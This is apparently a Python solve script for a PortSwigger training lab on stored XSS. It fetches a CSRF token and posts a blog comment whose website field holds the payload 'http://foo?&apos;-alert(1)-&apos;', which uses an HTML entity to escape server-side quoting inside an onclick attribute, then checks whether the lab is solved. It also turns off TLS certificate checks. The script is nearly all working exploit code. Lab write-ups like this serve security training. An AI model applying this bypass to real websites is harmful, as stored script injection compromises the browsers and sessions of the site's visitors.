#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab: Stored XSS into onclick event with angle brackets
and double quotes HTML-encoded and single quotes and backslash escaped.
Uses HTML entity &apos; to bypass server-side JS escaping in an onclick attribute.
"""

import argparse
import requests
import re
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def main():
    parser = argparse.ArgumentParser(
        description="Solve XSS Lab 20: Stored XSS into onclick with HTML entity bypass"
    )
    parser.add_argument("lab_url", help="Lab URL (e.g. https://0aXX00...web-security-academy.net)")
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    s = requests.Session()
    s.verify = False

    # Step 1: Fetch a blog post to get the CSRF token
    post_url = f"{lab}/post?postId=1"
    r = s.get(post_url)
    csrf_match = re.search(r'name="csrf" value="([^"]+)"', r.text)
    if not csrf_match:
        print("[-] Could not find CSRF token on blog post page")
        sys.exit(1)
    csrf = csrf_match.group(1)
    print(f"[+] CSRF token: {csrf[:20]}...")

    # Step 2: Post a comment with HTML entity payload in the Website field
    payload = "http://foo?&apos;-alert(1)-&apos;"
    comment_data = {
        "csrf": csrf,
        "postId": "1",
        "comment": "test",
        "name": "attacker",
        "email": "attacker@evil.com",
        "website": payload,
    }
    r = s.post(f"{lab}/post/comment", data=comment_data, allow_redirects=True)
    if r.status_code == 200:
        print(f"[+] Comment posted with website: {payload}")
    else:
        print(f"[-] Comment post returned status {r.status_code}")
        sys.exit(1)

    # Step 3: Verify the payload is in the onclick attribute
    r = s.get(post_url)
    if "&apos;-alert(1)-&apos;" in r.text:
        print("[+] Payload confirmed in onclick attribute")
    else:
        print("[!] Payload not found in response (may still work in browser)")

    # Step 4: Check if lab is solved
    r = s.get(lab)
    if "Congratulations" in r.text:
        print("[+] Lab solved!")
    else:
        print("[*] Click the author name on the comment to trigger alert(1)")
        print(f"    Visit: {post_url}")


if __name__ == "__main__":
    main()
